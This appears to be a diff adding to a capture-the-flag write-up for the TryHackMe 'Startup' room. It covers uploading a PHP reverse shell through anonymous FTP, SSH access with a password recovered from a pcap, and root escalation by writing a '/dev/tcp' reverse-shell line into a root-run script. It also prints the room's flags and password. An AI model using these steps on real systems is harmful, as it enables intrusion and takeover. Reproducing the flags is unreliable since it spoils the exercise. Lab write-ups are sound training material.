@@ -51,3 +51,115 @@ gobuster dir -u <target_ip> -w /usr/share/wordlist/rockyou.txt -b 403,404 -o gob
 And i saw a `files` directory within the web server
 
 ![](./files_found_during_exploitation/1.png)
+
+Most of the files are useless, but i saw the `ftp` open tho so i could put a reverse shell script to establish a conenction to the target machine 
+
+As i was login with the anonymous credential, i saw the previous files that we exploited and a directory that could allow every user to read, execure and WRITE 
+
+![](./files_found_during_exploitation/2.png)
+
+Download a reverse shell php file from `pentest monkey github` or other source of your choice (or you could create it)and then put it in the ftp folder 
+
+![](./files_found_during_exploitation/3.png)
+
+Establish a listening port match with the script that you provided (mine is `1234`) 
+
+```bash 
+nc -lnvp 1234
+```
+Open the website with the subdomain `files/ftp` and open our reverse shell script 
+
+![](./files_found_during_exploitation/4.png)
+
+We have the connection and found the first flag 
+
+![](./files_found_during_exploitation/5.png)
+
+`What is the secret spicy soup recipe?` -> `love` 
+
+Explore around and i found a directory that named quite weird `incidents` in the same directory 
+
+```bash 
+www-data@startup:/$ ls -la incidents/                        
+total 40
+drwxr-xr-x  2 www-data www-data  4096 Feb  4 16:40 .
+drwxr-xr-x 25 root     root      4096 Feb  4 14:26 ..
+-rwxr-xr-x  1 www-data www-data 31224 Nov 12  2020 suspicious.pcapng
+www-data@startup:/$ 
+```
+
+Examine it with wireshark -> found a password but it not for `www-data` but for another person named `lennie` in the `/home` directory 
+
+`password: c4ntg3t3n0ughsp1c3`
+
+
+```bash 
+www-data@startup:/home$ ls -la
+total 12
+drwxr-xr-x  3 root   root   4096 Nov 12  2020 .
+drwxr-xr-x 25 root   root   4096 Feb  4 14:26 ..
+drwx------  5 lennie lennie 4096 Feb  4 15:46 lennie
+```
+I found `ssh` open 'intentionally' so we could use the password with user `lennie` 1
+
+```bash 
+ssh lennie@<target_ip> 
+1
+# and c4ntg3t3n0ughsp1c3
+```
+and we have the `user.txt` flag
+
+`user.txt: THM{03ce3d619b80ccbfb3b7fc81e46c0e79}`
+
+We saw a `scrip` directory with a `.sh` file in side it owned by `root` 
+
+```bash 
+lennie@startup:~/scripts$ ls
+planner.sh  startup_list.txt
+lennie@startup:~/scripts$ 
+```
+I ran `cat /etc/crontab` and i return nothing. After a while, runnning 
+
+```bash 
+ps aux
+```
+and we have root ran lennie script every one minutes
+
+```bash 
+root     17992  0.0  0.0   4500   740 ?        Ss   15:49   0:00 /bin/sh -c /home/lennie/scripts/planner.sh
+root     17993  0.0  0.2  11224  2996 ?        S    15:49   0:00 /bin/bash /home/lennie/scripts/planner.sh
+root     17994  0.0  0.2  11224  3004 ?        S    15:49   0:00 /bin/bash /etc/print.sh
+```
+
+And lennie can So we injected a reverse shell script in /etc/print.sh since `lennie` have permission to change it 
+
+```bash 
+lennie@startup:~/scripts$ ls
+planner.sh  startup_list.txt
+lennie@startup:~/scripts$ cat planner.sh 
+#!/bin/bash
+echo $LIST > /home/lennie/scripts/startup_list.txt
+/etc/print.sh
+lennie@startup:~/scripts$ cat /etc/print.sh
+#!/bin/bash
+echo "Done!"
+sh -i >& /dev/tcp/192.168.129.210/4444 0>&1
+```
+Establish another listening shell 
+
+```bash 
+nc -lnvp 4444
+```
+Wait a bit and we have `root` shell !!! 
+
+```bash 
+└─$ nc -lnvp 4444      
+listening on [any] 4444 ...
+connect to [192.168.129.210] from (UNKNOWN) [10.48.135.212] 44146
+sh: 0: can't access tty; job control turned off
+# whoami
+root
+```
+and we have the final `root.txt` flag 
+
+`root.txt: THM{f963aaa6a430f210222158ae15c3d76d}`
